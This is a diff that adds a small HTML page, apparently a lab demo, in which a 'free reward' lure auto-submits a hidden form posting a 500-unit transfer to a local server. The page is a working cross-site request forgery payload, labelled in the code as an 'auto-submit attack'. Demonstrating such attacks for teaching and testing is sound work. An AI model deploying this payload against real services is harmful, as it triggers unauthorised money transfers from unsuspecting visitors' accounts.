@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Free Gift</title>
+</head>
+
+<body>
+
+<h1>🎁 Click here to claim free reward!</h1>
+
+<form action="http://localhost:3000/transfer" method="POST" id="csrfForm">
+    <input type="hidden" name="amount" value="500">
+</form>
+
+<script>
+    // Auto-submit attack
+    document.getElementById("csrfForm").submit();
+</script>
+
+</body>
+</html>
